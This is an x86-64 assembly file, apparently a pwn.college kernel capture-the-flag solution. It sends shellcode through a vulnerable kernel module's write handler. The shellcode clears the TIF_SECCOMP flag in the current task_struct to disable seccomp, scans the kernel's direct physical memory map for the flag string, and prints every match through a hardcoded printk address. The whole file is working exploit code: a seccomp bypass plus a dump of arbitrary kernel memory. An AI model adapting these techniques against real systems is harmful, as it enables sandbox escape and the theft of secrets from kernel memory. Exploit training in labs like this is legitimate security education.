BITS 64

call _start

_kernel_sc:
; turning off seccomp by disabling TIF_SECCOMP
; gs+0x15d00 points to current_task_struct
; current_task_struct is a pointer to the task_struct
; esencially we are doing current_task_struct->thread_info.flag &= (1 << TIF_SECCOMP)
mov rax, [gs:0x15d00]
and qword [rax], 0xfffffffffffffeff
xor rax, rax
; inspect direct mapping of all physical memory
; ffff888000000000 - ffffc87fffffffff
mov rax, 0xffff888000000000
mov rbx, 0xffff88807bdf4000
mov rcx, 0x6c6c6f632e6e7770 ; "pwn.coll"
_dm_loop:
  cmp rax, rbx
  jae _dm_end

  mov rdx, [rax]
  cmp rdx, rcx
  ; cmp [rax], rcx
  je _dm_dump

_dm_next:
  add rax, 1
  jmp _dm_loop

_dm_dump:
  ; call printk
  push rax
  push rbx
  push rcx
  push rdx
  lea rdi, [rel fmt]
  mov rsi, [rsp + 0x18]
  mov rbx, 0xffffffff810b69a9 
  call rbx
  pop rdx
  pop rcx
  pop rbx
  pop rax
  jmp _dm_next
_dm_end:
  ret

fmt:
  db "Memory Inspection Log @ %s", 0xa, 0


_start:
  ; write(module_fd, sc, sc_len)
  ; this invokes the `device_write` function of the kernel module
  xor rax, rax
  xor rdi, rdi
  xor rsi, rsi
  xor rdx, rdx
  mov rdi, 3
  pop rsi
  mov rdx, _start - _kernel_sc
  mov al, 1
  syscall
  ; exit(0)
  mov rax, 60
  xor rdi, rdi
  syscall
